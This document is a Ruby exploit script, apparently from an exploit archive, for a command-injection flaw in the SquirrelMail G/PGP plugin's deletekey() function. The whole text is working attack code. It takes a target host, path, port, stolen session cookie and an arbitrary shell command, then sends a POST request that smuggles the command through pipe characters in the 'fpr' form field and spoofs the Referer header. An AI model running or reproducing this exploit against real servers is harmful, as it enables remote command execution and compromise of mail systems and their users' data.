SquirrelMail G/PGP Plugin deletekey() Command Injection Exploit
===============================================================




#!/usr/local/bin/ruby

puts"http://backdoored.net\n"
puts "SquirrelMail G/PG deletekey() command injection exploit\n"
puts "Coded by Backdoored member.   \n" 
puts "--------------------------------------------------\n"

if ARGV[0] == nil && ARGV[1] == nil && ARGV[2] ==  nil && ARGV[3] == nil && ARGV[4] == nil && ARGV[5] == nil
puts "Usage: ./squ_xploit  hostname path port cookie command 0\n"
puts "if host using ssl use 1 instead of 0\n"
exit
end

require &#039;net/http&#039;
require &#039;net/https&#039;

host = ARGV[0].to_s
port = ARGV[2].to_i
cookie = ARGV[3].to_s
victim = Net::HTTP.new(host,port)
	if ARGV[3].to_i == 1
	puts "Entering SSL mode baby\n"
	victim.use_ssl = true
	end
command = ARGV[4].to_s
#path = &#039;/sq/plugins/gpg/modules/keyring_main.php&#039;
path = ARGV[1].to_s
data = "id=C5B1611B8E71C***&fpr= | " + command + "| &pos=0&sort=email_name&desc=&srch=&ring=all&passphrase=&deletekey=true&deletepair=false&trust=1"
pizza = "key=pYWrEbVTY%2Bc%3D; SQMSESSID=" + cookie;
headers = {
  &#039;Cookie&#039; => pizza,
  &#039;Referer&#039; => &#039;http://www.google.com&#039;,
  &#039;Content-Type&#039; => &#039;application/x-www-form-urlencoded&#039;
}
resp, data = victim.post(path,data,headers)
puts &#039;Message = &#039; + resp.message
puts  &#039;Code = &#039; + resp.code

resp.each {|key,val| puts key + &#039; = &#039; + val}
#puts data



